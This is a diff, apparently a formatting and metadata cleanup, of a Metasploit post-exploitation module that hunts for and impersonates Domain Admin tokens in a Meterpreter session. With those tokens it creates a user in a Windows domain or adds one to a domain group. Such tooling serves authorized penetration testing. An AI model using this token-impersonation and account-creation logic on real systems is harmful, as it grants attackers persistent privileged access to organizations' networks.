@@ -7,32 +7,52 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Accounts
   include Msf::Exploit::Deprecated
-  
+
   moved_from 'post/windows/manage/add_user_domain'
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Windows Manage Add User to the Domain and/or to a Domain Group',
-      'Description'   => %q(
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Add User to the Domain and/or to a Domain Group',
+        'Description' => %q{
           This module adds a user to the Domain and/or to a Domain group. It will
-        check if sufficient privileges are present for certain actions and run
-        getprivs for system.  If you elevated privs to system, the
-        SeAssignPrimaryTokenPrivilege will not be assigned. You need to migrate to
-        a process that is running as system. If you don't have privs, this script
-        exits.
-      ),
-      'License'       => MSF_LICENSE,
-      'Author'        => 'Joshua Abraham <jabra[at]rapid7.com>',
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]))
+          check if sufficient privileges are present for certain actions and run
+          getprivs for system.  If you elevated privs to system, the
+          SeAssignPrimaryTokenPrivilege will not be assigned. You need to migrate to
+          a process that is running as system. If you don't have privs, this script
+          exits.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'Joshua Abraham <jabra[at]rapid7.com>',
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              incognito_impersonate_token
+              incognito_list_tokens
+              stdapi_sys_config_getuid
+              stdapi_sys_config_steal_token
+              stdapi_sys_process_get_processes
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
+        }
+      )
+    )
     register_options(
       [
-        OptString.new('USERNAME',  [true,  'The username of the user to add (not-qualified, e.g. BOB)']),
-        OptString.new('PASSWORD',  [false, 'Password of the user']),
-        OptString.new('GROUP',     [false, 'Add user into group, creating it if necessary']),
-        OptBool.new('ADDTOGROUP',  [true,  'Add group if it does not exist', false]),
-        OptBool.new('ADDTODOMAIN', [true,  'Add to Domain if true, otherwise add locally', true]),
-        OptString.new('TOKEN',     [false, 'Username or PID of the token which will be used (if blank, Domain Admin tokens will be enumerated)', '']),
+        OptString.new('USERNAME', [true, 'The username of the user to add (not-qualified, e.g. BOB)']),
+        OptString.new('PASSWORD', [false, 'Password of the user']),
+        OptString.new('GROUP', [false, 'Add user into group, creating it if necessary']),
+        OptBool.new('ADDTOGROUP', [true, 'Add group if it does not exist', false]),
+        OptBool.new('ADDTODOMAIN', [true, 'Add to Domain if true, otherwise add locally', true]),
+        OptString.new('TOKEN', [false, 'Username or PID of the token which will be used (if blank, Domain Admin tokens will be enumerated)', '']),
       ]
     )
   end
@@ -85,7 +105,7 @@ class MetasploitModule < Msf::Post
 
     ## load incognito
     if !session.incognito
-      session.core.use("incognito")
+      session.core.use('incognito')
     end
 
     if !session.incognito
@@ -94,7 +114,7 @@ class MetasploitModule < Msf::Post
     end
 
     ## verify domain_user contains a domain
-    if domain_user.index("\\").nil?
+    if domain_user.index('\\').nil?
       domain_user = "#{domain}\\#{domain_user}"
     else
       domain_user = ''
@@ -113,7 +133,7 @@ class MetasploitModule < Msf::Post
     ## token is a Domain User
     else
       session.sys.process.get_processes.sort_by { rand }.each do |x|
-        if ((x['user'] == domain_user) && (target_pid == ''))
+        if (x['user'] == domain_user) && (target_pid == '')
           target_pid = x['pid']
           print_status("Found token for #{domain_user}")
         end
@@ -139,9 +159,9 @@ class MetasploitModule < Msf::Post
         return false
       end
     else
-      print_status("No process tokens found.")
+      print_status('No process tokens found.')
       if (domain_user != '')
-        vprint_status("Trying impersonate_token technique...")
+        vprint_status('Trying impersonate_token technique...')
         session.incognito.incognito_impersonate_token(domain_user)
       else
         return false
@@ -155,11 +175,11 @@ class MetasploitModule < Msf::Post
   ## Return: token_found,token_user,current_user; otherwise false
   def token_hunter(domain)
     ## gather data
-    domain_admins = get_members_from_group('Domain Admins', get_domain("DomainControllerName"))
+    domain_admins = get_members_from_group('Domain Admins', get_domain('DomainControllerName'))
 
     ## load incognito
     if !session.incognito
-      session.core.use("incognito")
+      session.core.use('incognito')
     end
 
     if !session.incognito
@@ -177,8 +197,8 @@ class MetasploitModule < Msf::Post
       ## parse delegation tokens
       res = session.incognito.incognito_list_tokens(0)
       if res
-        res["delegation"].split("\n").each do |user|
-          ndom, nusr = user.split("\\")
+        res['delegation'].split("\n").each do |user|
+          ndom, nusr = user.split('\\')
           if !nusr
             nusr = ndom
             ndom = nil
@@ -239,7 +259,7 @@ class MetasploitModule < Msf::Post
           check_result(result)
         end
       else
-        print_error("Check your group name")
+        print_error('Check your group name')
       end
     end
     #  Add Member to LocalGroup
@@ -255,11 +275,11 @@ class MetasploitModule < Msf::Post
 
   def domain_mode
     ## check domain
-    server_name = get_domain("DomainControllerName")
+    server_name = get_domain('DomainControllerName')
     if server_name
       print_good("Found Domain : #{server_name}")
     else
-      print_error("No DC is available for the specified domain or the domain does not exist. ")
+      print_error('No DC is available for the specified domain or the domain does not exist. ')
       return false
     end
     if datastore['PASSWORD'].nil?
@@ -310,7 +330,7 @@ class MetasploitModule < Msf::Post
           print_error("The #{datastore['GROUP']} group not exist in the domain. It is possible that the same group name exists for the local group.")
         end
       else
-        print_error("Check your group name")
+        print_error('Check your group name')
       end
     end
 
@@ -334,19 +354,21 @@ class MetasploitModule < Msf::Post
 
   # Run Method for when run command is issued
   def run
-    print_status("Running module on '#{sysinfo['Computer']}'")
-    if datastore["ADDTODOMAIN"]
-      print_status("Domain Mode")
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module on #{hostname} (#{session.session_host})")
+
+    if datastore['ADDTODOMAIN']
+      print_status('Domain Mode')
       domain_mode
     else
-      print_status("Local Mode")
+      print_status('Local Mode')
       local_mode
     end
     return nil
   end
 
   def primary_domain
-    dom_info = get_domain("DomainControllerName")
+    dom_info = get_domain('DomainControllerName')
     if !dom_info.nil? && dom_info =~ /\./
       foo = dom_info.split('.')
       domain = foo[1].upcase
